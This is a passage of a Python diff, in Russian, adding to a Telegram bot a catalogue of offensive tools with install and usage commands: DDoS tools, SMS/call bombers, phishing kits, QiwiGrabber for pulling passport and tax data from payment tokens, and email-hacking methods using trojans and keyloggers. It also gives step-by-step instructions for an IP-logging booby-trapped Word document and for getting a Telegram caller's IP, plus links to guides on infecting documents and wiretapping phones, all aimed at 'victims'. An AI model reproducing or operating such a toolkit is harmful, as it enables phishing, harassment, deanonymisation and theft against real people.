+            "description": "Точное местоположение через фишинг",
+            "install": "git clone https://github.com/bhikandeshmukh/MapEye.git\ncd MapEye\npip install requests",
+            "usage": "python mapeye.py -h"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 7. ПЕНТЕСТ И ФРЕЙМВОРКИ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    PENTEST_TOOLS = {
+        "txtool": {
+            "url": "https://github.com/kuburan/txtool.git",
+            "description": "Хакерский фреймворк для Termux",
+            "install": "git clone https://github.com/kuburan/txtool.git\ncd txtool\n./install.py",
+            "usage": "txtool"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # МЕТОДЫ ДЛЯ ГЕНЕРАЦИИ ОТЧЁТОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    @staticmethod
+    def get_all_tools() -> dict:
+        """Возвращает все инструменты"""
+        return {
+            "osint": TermuxTools.OSINT_TOOLS,
+            "ip": TermuxTools.IP_TOOLS,
+            "ddos": TermuxTools.DDOS_TOOLS,
+            "bomber": TermuxTools.BOMBER_TOOLS,
+            "phishing": TermuxTools.PHISHING_TOOLS,
+            "tracking": TermuxTools.TRACKING_TOOLS,
+            "pentest": TermuxTools.PENTEST_TOOLS
+        }
+    
+    @staticmethod
+    def generate_report() -> str:
+        """Генерирует полный отчёт"""
+        lines = []
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append("│                         🔥 TERMUX RUS — ПОЛНЫЙ АРСЕНАЛ ИНСТРУМЕНТОВ 🔥                                        ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("")
+        
+        # OSINT
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🔍 OSINT ИНСТРУМЕНТЫ                                                │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.OSINT_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # IP/Геолокация
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🌍 IP И ГЕОЛОКАЦИЯ                                                 │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.IP_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # DDoS
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💀 DDOS ИНСТРУМЕНТЫ                                                │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.DDOS_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Бомберы
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💣 SMS/CALL БОМБЕРЫ                                                │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.BOMBER_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Фишинг
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🎣 ФИШИНГ ИНСТРУМЕНТЫ                                              │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.PHISHING_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Слежка
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🕵️ СЛЕЖКА И ДЕАНОНИМИЗАЦИЯ                                        │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, info in TermuxTools.TRACKING_TOOLS.items():
+            lines.append(f"│  📌 {name}")
+            lines.append(f"│     🔗 {info['url']}")
+            lines.append(f"│     📝 {info['description']}")
+            lines.append(f"│     ⚙️  {info['usage']}")
+            lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # ИТОГО
+        total = (len(TermuxTools.OSINT_TOOLS) + len(TermuxTools.IP_TOOLS) + 
+                 len(TermuxTools.DDOS_TOOLS) + len(TermuxTools.BOMBER_TOOLS) +
+                 len(TermuxTools.PHISHING_TOOLS) + len(TermuxTools.TRACKING_TOOLS) +
+                 len(TermuxTools.PENTEST_TOOLS))
+        
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"│  ✅ ВСЕГО ИНСТРУМЕНТОВ: {total:<58} │")
+        lines.append(f"│  🔍 OSINT: {len(TermuxTools.OSINT_TOOLS):<58} │")
+        lines.append(f"│  🌍 IP/Гео: {len(TermuxTools.IP_TOOLS):<58} │")
+        lines.append(f"│  💀 DDoS: {len(TermuxTools.DDOS_TOOLS):<58} │")
+        lines.append(f"│  💣 Бомберы: {len(TermuxTools.BOMBER_TOOLS):<56} │")
+        lines.append(f"│  🎣 Фишинг: {len(TermuxTools.PHISHING_TOOLS):<57} │")
+        lines.append("│  🚀 TERMUX RUS — ПОЛНЫЙ АРСЕНАЛ                                                                             │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# НОВЫЕ КОМАНДЫ ДЛЯ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['termux', 'termuxtools', 'termuxrus'])
+def termux_tools_command(message):
+    """Показывает все Termux инструменты"""
+    report = TermuxTools.generate_report()
+    
+    if len(report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 TERMUX RUS — ПОЛНЫЙ АРСЕНАЛ")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['osinttools', 'osinttermux'])
+def osint_termux_command(message):
+    """Показывает OSINT инструменты для Termux"""
+    text = "🔍 **OSINT ИНСТРУМЕНТЫ ДЛЯ TERMUX**\n\n"
+    for name, info in TermuxTools.OSINT_TOOLS.items():
+        text += f"**{name}**\n"
+        text += f"└─ {info['description']}\n"
+        text += f"└─ `{info['usage']}`\n\n"
+    
+    if len(text) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(text)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 OSINT ДЛЯ TERMUX")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['ddostools', 'ddostermux'])
+def ddos_termux_command(message):
+    """Показывает DDoS инструменты для Termux"""
+    text = "💀 **DDoS ИНСТРУМЕНТЫ ДЛЯ TERMUX**\n\n"
+    for name, info in TermuxTools.DDOS_TOOLS.items():
+        text += f"**{name}**\n"
+        text += f"└─ {info['description']}\n"
+        text += f"└─ `{info['usage']}`\n\n"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['bombers', 'smsbombers'])
+def bombers_command(message):
+    """Показывает SMS/Call бомберы"""
+    text = "💣 **SMS/CALL БОМБЕРЫ ДЛЯ TERMUX**\n\n"
+    for name, info in TermuxTools.BOMBER_TOOLS.items():
+        text += f"**{name}**\n"
+        text += f"└─ {info['description']}\n"
+        text += f"└─ `{info['usage']}`\n\n"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['phishing', 'phish'])
+def phishing_command(message):
+    """Показывает фишинг инструменты"""
+    text = "🎣 **ФИШИНГ ИНСТРУМЕНТЫ ДЛЯ TERMUX**\n\n"
+    for name, info in TermuxTools.PHISHING_TOOLS.items():
+        text += f"**{name}**\n"
+        text += f"└─ {info['description']}\n"
+        text += f"└─ `{info['usage']}`\n\n"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['sherlock', 'поискпонику'])
+def sherlock_command(message):
+    """Инструкция по Sherlock"""
+    text = """🕵️ **SHERLOCK — ПОИСК ПО НИКНЕЙМУ**
+
+**Установка:**
+```bash
+git clone https://github.com/sherlock-project/sherlock
+cd sherlock
+pip install -r requirements.txt
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 23: РАСШИРЕННЫЙ АРСЕНАЛ (ВИРТУАЛЬНЫЕ НОМЕРА, ВЗЛОМ ПОЧТЫ, ФИШИНГ, QIWIGRABBER)
+# Виртуальные номера | Взлом почты | Фишинг в Word | QiwiGrabber | Wireshark
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class ExtendedTools:
+    """Расширенные инструменты для OSINT и не только"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 1. ВИРТУАЛЬНЫЕ НОМЕРА (ПОЛУЧЕНИЕ SMS)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    VIRTUAL_NUMBERS_PAID = {
+        "Twilio.com": "https://twilio.com - аренда номера на год, есть приложение",
+        "onlinesim.ru": "https://onlinesim.ru - получение SMS, регистрация аккаунтов",
+        "Esendex.co.uk": "https://esendex.co.uk - 7 дней пробного периода, 25 бесплатных SMS",
+        "Burstsms.com.au": "https://burstsms.com.au - 14 дней пробного периода",
+        "Directsms.com.au": "https://directsms.com.au - 30-дневная пробная версия",
+        "Vumber.com": "https://vumber.com - 14-дневная пробная версия",
+    }
+    
+    VIRTUAL_NUMBERS_FREE = {
+        "Smsc.ru": "https://smsc.ru - русские и украинские номера, нужна регистрация",
+        "Receive-sms-online.info": "https://receive-sms-online.info",
+        "Receivefreesms.net": "https://receivefreesms.net",
+        "Sms-receive.net": "https://sms-receive.net",
+        "Receive-a-sms.com": "https://receive-a-sms.com",
+        "Hs3x.com": "https://hs3x.com",
+        "Receive-sms-now.com": "https://receive-sms-now.com - есть русские номера",
+        "Smsreceivefree.com": "https://smsreceivefree.com",
+        "Receivesmsonline.com": "https://receivesmsonline.com",
+        "Getsms.org": "https://getsms.org - есть русские номера",
+        "Tempsms.ru": "https://tempsms.ru - есть русские номера",
+        "Numberforsms.com": "https://numberforsms.com - есть русские номера",
+        "Sonetel.com": "https://sonetel.com",
+        "Smska.us": "https://smska.us - есть русские номера",
+        "Sellaite.com": "https://sellaite.com",
+        "Sms.ink": "https://sms.ink - есть русские номера",
+        "Proovl.com": "https://proovl.com",
+        "Zadarma.com": "https://zadarma.com - есть русские номера",
+        "Getfreesmsnumber.com": "https://getfreesmsnumber.com",
+        "Receive-smsonline.net": "https://receive-smsonline.net",
+        "Receivefreesms.com": "https://receivefreesms.com",
+        "Receivesmsverification.com": "https://receivesmsverification.com",
+        "Sms-online.co": "https://sms-online.co",
+        "Ireceivesmsonline.com": "https://ireceivesmsonline.com",
+        "Receive-sms-online.com": "https://receive-sms-online.com - есть украинские номера",
+        "Receive-sms-free.com": "https://receive-sms-free.com",
+        "Esendex.com.au": "https://esendex.com.au - нужна регистрация",
+        "Receivesmsonline.in": "https://receivesmsonline.in",
+        "Mytrashmobile.com": "https://mytrashmobile.com",
+        "Receivesmsonline.me": "https://receivesmsonline.me",
+        "Anon-sms.com": "https://anon-sms.com",
+        "Mfreesms.com": "https://mfreesms.com",
+        "Spryng.nl": "https://spryng.nl - нужна регистрация",
+        "Smsreceiveonline.com": "https://smsreceiveonline.com",
+        "Smsget.net": "https://smsget.net - Мегафон и Билайн номера",
+    }
+    
+    VIRTUAL_NUMBERS_APPS = {
+        "SafeUM": "Android, номер Литвы, НЕ принимает СМС",
+        "TextNow": "Номер США, принимает СМС и голосовую почту",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 2. ВЗЛОМ ПОЧТЫ (МЕТОДЫ)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    EMAIL_HACKING_METHODS = {
+        "Троян (DarkComet RAT, SpyEye, Carberp, ZeuS)": {
+            "description": "Рассылка писем со встроенным вирусом или ссылкой",
+            "method": "Троян устанавливается через инсталлятор, после чего хакер получает полный контроль"
+        },
+        "Взлом по номеру телефона": {
+            "description": "Сброс пароля через SMS, социальная инженерия",
+            "method": "Мошенник отправляет SMS с просьбой переслать код подтверждения"
+        },
+        "Доступ к компьютеру": {
+            "description": "Кейлоггеры или программы восстановления паролей",
+            "tools": "SniperSpy, Mail PassView, WebBrowserPassView, Dialupass",
+            "method": "Запуск на компьютере жертвы для перехвата паролей"
+        },
+        "Социальная инженерия": {
+            "description": "Звонок оператору или техподдержку",
+            "example": "Взлом почты директора ЦРУ подростком"
+        },
+        "Фишинг": {
+            "description": "Фейковая страница авторизации",
+            "method": "Создание копии страницы входа и сбор логинов/паролей"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 3. ФИШИНГ В MICROSOFT WORD (IPlogger)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    WORD_PHISHING_STEPS = [
+        "1. Создать новый документ Word",
+        "2. Вставка → Интеграция видео из интернета → YouTube",
+        "3. Выбрать любой ролик",
+        "4. Сохранить и закрыть документ",
+        "5. Открыть WinRAR → найти документ",
+        "6. Открыть внутреннее содержимое → папка word → файл document.xml",
+        "7. Перетащить на рабочий стол, открыть блокнотом",
+        "8. Найти ссылку на видео, заменить на ссылку IPlogger'a",
+        "9. Сохранить и вернуть в WinRAR",
+    ]
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 4. QIWIGRABBER — ПОЛУЧЕНИЕ ДАННЫХ ПО ТОКЕНУ QIWI
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    QIWIGRABBER_INFO = {
+        "url": "https://github.com/tenych69/QiwiGrabber",
+        "description": "Получение данных по токену Qiwi",
+        "data": "Номер телефона, IP-адрес, Почта, Баланс, Паспортные данные, ИНН, СНИЛС",
+        "install": """
+git clone https://github.com/tenych69/QiwiGrabber
+cd QiwiGrabber
+pip install request
+pip install colorama
+python QiwiGrabber.py
+""",
+        "token_url": "https://qiwi.com/api"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 5. H8MAIL — ПОИСК УТЕЧЕК ПО EMAIL
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    H8MAIL_INFO = {
+        "description": "Поиск паролей в слитых базах данных по email",
+        "install": """
+pkg update -y && pkg upgrade -y
+pkg install git python
+pip install requests
+pip install h8mail
+""",
+        "usage": "h8mail -t почта@example.com"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 6. WIRESHARK — ПОЛУЧЕНИЕ IP ЧЕРЕЗ TELEGRAM ЗВОНОК
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    WIRESHARK_IP_STEPS = [
+        "1. Скачать Wireshark",
+        "2. Открыть и в фильтре указать протокол STUN",
+        "3. Нажать 'лупу' (Найти пакет) → выбрать параметр 'Строка'",
+        "4. В строке написать XDR-MAPPED-ADDRESS",
+        "5. Включить Wireshark и позвонить через Telegram",
+        "6. Как только пользователь ответит — появится IP адрес",
+        "7. Найти в поиске XDR-MAPPED-ADDRESS → то, что после него — IP жертвы",
+    ]
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 7. ДОПОЛНИТЕЛЬНЫЕ ССЫЛКИ (СТАТЬИ И МАНУАЛЫ)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    ARTICLES = {
+        "5 способов угнать почту": "https://teletype.in/@darksull/DZ1_enHpp",
+        "Parrot OS — установка на флешку": "https://telegra.ph/Parrot-08-05",
+        "Как заразить документы Office": "https://teletype.in/@darksull/M2ecry5ML",
+        "Вирусы в Word": "https://teletype.in/@darksull/UfgN-WEjD",
+        "Виртуальные номера": "https://teletype.in/@hackerplace.org/DZ5MUI01a",
+        "Кейлоггеры — клавиатурные шпионы": "https://telegra.ph/Kejloggery--klaviaturnye-shpiony-08-11",
+        "Сайты для практики хаккинга": "https://telegra.ph/Sajty-dlya-praktiki-hakinga-08-13",
+        "Brut Facebook": "https://telegra.ph/Brut-Facebook-07-24",
+        "Перехват данных по Wi-Fi сети": "https://telegra.ph/Perehvat-dannyh-po-Wi-Fi-seti-08-11",
+        "Zframe — сборник утилит": "https://telegra.ph/Zframe-sbornik-utilit-dlya-hakinga-04-29",
+        "Lazybee — генерация базы паролей": "https://telegra.ph/Lazybee-Generiruem-bazu-parolej-dlya-bruta-04-27",
+        "Metasploit — взлом Android": "https://telegra.ph/Tvoj-smartfon-ugnan-Metasploittermux-android-hack-04-24",
+        "THC Hydra — брутфорс паролей": "https://telegra.ph/THC-Hydra-Bystryj-vzlomshchik-parolej-04-24",
+        "Tweetshell — брутфорс Twitter": "https://telegra.ph/tweetshell-Bruteforce-tvittera-04-24",
+        "Wireshark — перехват трафика": "https://telegra.ph/Perehvat-i-analiz-trafika-so-smartfona-pri-pomoshchi-Wireshark-04-25-2",
+        "EncryptPad — шифрование": "https://telegra.ph/SHifruem-zapisi-foto-i-arhivy-s-pomoshchyu-EncryptPad-04-26",
+        "Прослушка через Termux": "https://telegra.ph/Proslushka-na-chuzhoj-telefon-cherez-Termux-04-17",
+        "Почта — угон за 5 способов": "https://teletype.in/@darksull/bsa48fBDa",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # МЕТОДЫ ДЛЯ ГЕНЕРАЦИИ ОТЧЁТОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    @staticmethod
+    def get_virtual_numbers_report() -> str:
+        """Отчёт по виртуальным номерам"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📱 ВИРТУАЛЬНЫЕ НОМЕРА                                             │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  💰 ПЛАТНЫЕ СЕРВИСЫ (аренда номера):                                                                       │")
+        for name, url in ExtendedTools.VIRTUAL_NUMBERS_PAID.items():
+            lines.append(f"│     • {name}: {url} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🆓 БЕСПЛАТНЫЕ СЕРВИСЫ (приём SMS):                                                                        │")
+        for name, url in list(ExtendedTools.VIRTUAL_NUMBERS_FREE.items())[:15]:
+            lines.append(f"│     • {name}: {url} │")
+        lines.append(f"│     ... и ещё {len(ExtendedTools.VIRTUAL_NUMBERS_FREE) - 15} сервисов                                       │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  📱 ПРИЛОЖЕНИЯ:                                                                                            │")
+        for name, desc in ExtendedTools.VIRTUAL_NUMBERS_APPS.items():
+            lines.append(f"│     • {name}: {desc} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_qiwigrabber_report() -> str:
+        """Отчёт по QiwiGrabber"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💰 QIWIGRABBER                                                    │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🔗 GitHub: {ExtendedTools.QIWIGRABBER_INFO['url']}                                      │")
+        lines.append(f"│  📝 Описание: {ExtendedTools.QIWIGRABBER_INFO['description']}                                             │")
+        lines.append(f"│  📊 Что находит: {ExtendedTools.QIWIGRABBER_INFO['data']}                                                 │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in ExtendedTools.QIWIGRABBER_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🔑 Токен брать: {ExtendedTools.QIWIGRABBER_INFO['token_url']}                                             │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_h8mail_report() -> str:
+        """Отчёт по h8mail"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📧 H8MAIL — ПОИСК УТЕЧЕК                                          │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  📝 Описание: {ExtendedTools.H8MAIL_INFO['description']}                                                   │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in ExtendedTools.H8MAIL_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ИСПОЛЬЗОВАНИЕ: {ExtendedTools.H8MAIL_INFO['usage']}                                                    │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_wireshark_report() -> str:
+        """Отчёт по Wireshark"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🔍 ПОЛУЧЕНИЕ IP ЧЕРЕЗ TELEGRAM                                     │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ ИНСТРУКЦИЯ:                                                                                            │")
+        for step in ExtendedTools.WIRESHARK_IP_STEPS:
+            lines.append(f"│     {step:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚠️ ВАЖНО: Отключите возможность принимать звонки в настройках Telegram                                    │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_word_phishing_report() -> str:
+        """Отчёт по фишингу в Word"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📄 ФИШИНГ В MICROSOFT WORD                                         │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for step in ExtendedTools.WORD_PHISHING_STEPS:
+            lines.append(f"│  {step:<70} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚠️ После открытия документа жертвой — вы получите её IP и координаты                                       │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_articles_report() -> str:
+        """Отчёт со статьями"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📚 СТАТЬИ И МАНУАЛЫ                                                │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in ExtendedTools.ARTICLES.items():
+            lines.append(f"│  • {name}: {url[:55]} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def generate_full_report() -> str:
+        """Генерирует полный отчёт"""
+        parts = [
+            ExtendedTools.get_virtual_numbers_report(),
+            ExtendedTools.get_qiwigrabber_report(),
+            ExtendedTools.get_h8mail_report(),
+            ExtendedTools.get_wireshark_report(),
+            ExtendedTools.get_word_phishing_report(),
+            ExtendedTools.get_articles_report(),
+        ]
+        
+        lines = []
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append("│                         🔥 РАСШИРЕННЫЙ АРСЕНАЛ — ВИРТ НОМЕРА, ВЗЛОМ ПОЧТЫ, ФИШИНГ 🔥                         ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"│  📅 АКТУАЛЬНО НА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50} ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("")
+        
+        for part in parts:
+            lines.append(part)
+            lines.append("")
+        
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"│  ✅ Всего виртуальных сервисов: {len(ExtendedTools.VIRTUAL_NUMBERS_PAID) + len(ExtendedTools.VIRTUAL_NUMBERS_FREE)}         │")
+        lines.append(f"│  📚 Всего статей: {len(ExtendedTools.ARTICLES)}                                                              │")
+        lines.append("│  🚀 REPORT GENERATED SUCCESSFULLY                                                                           │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# НОВЫЕ КОМАНДЫ ДЛЯ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['extended', 'расширенный'])
+def extended_command(message):
+    """Показывает расширенный арсенал"""
+    report = ExtendedTools.generate_full_report()
+    
+    if len(report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 РАСШИРЕННЫЙ АРСЕНАЛ")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['virtualnumbers', 'virtual', 'виртномера'])
+def virtual_numbers_command(message):
+    """Виртуальные номера"""
+    report = ExtendedTools.get_virtual_numbers_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['qiwi', 'qiwigrabber'])
+def qiwigrabber_command(message):
+    """QiwiGrabber инструкция"""
+    report = ExtendedTools.get_qiwigrabber_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['h8mail', 'поискпотечек'])
+def h8mail_command(message):
+    """h8mail инструкция"""
+    report = ExtendedTools.get_h8mail_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['wireshark', 'ipчерезтелеграм'])
+def wireshark_command(message):
+    """Wireshark инструкция"""
+    report = ExtendedTools.get_wireshark_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['wordphish', 'фишингворд'])
+def wordphish_command(message):
+    """Фишинг в Word"""
+    report = ExtendedTools.get_word_phishing_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['articles', 'статьи'])
+def articles_command(message):
+    """Статьи и мануалы"""
+    report = ExtendedTools.get_articles_report()
+    bot.send_message(message.chat.id, report)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 24: WIFI ВЗЛОМ, DDOS, ВЗЛОМ ПРИЛОЖЕНИЙ, DNS, USB-СТИЛЛЕР, ЭТИЧНЫЙ ХАКИНГ
+# Источник: TERMUX RUS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class TermuxAdvancedTools:
+    """Продвинутые инструменты для Termux и не только"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 1. ВЗЛОМ WI-FI (WIFITE2)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    WIFITE2_INFO = {
+        "name": "Wifite2",
+        "url": "https://github.com/derv82/wifite2.git",
+        "description": "Утилита для аудита Wi-Fi сетей, автоматизирует взлом WEP/WPA/WPS",
+        "install": """
+git clone https://github.com/derv82/wifite2.git
+cd wifite2
+sudo ./Wifite.py
+""",
+        "usage": "./Wifite.py"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 2. DDoS АТАКА (Golden Eye)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    GOLDEN_EYE_INFO = {
+        "name": "Golden Eye",
+        "url": "https://github.com/jseidl/GoldenEye",
+        "description": "DoS атака на веб-сервер",
+        "install": """
+mkdir GoldenEye
+cd GoldenEye
+wget https://github.com/jseidl/GoldenEye/archive/master.zip
+unzip master.zip
+""",
+        "usage": "./goldeneye.py http://IP_АДРЕС/info.php"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 3. ВЗЛОМ ПЛАТНЫХ ПРИЛОЖЕНИЙ ANDROID
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    ANDROID_CRACK_TOOLS = {
+        "Apktool": "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.0.jar",
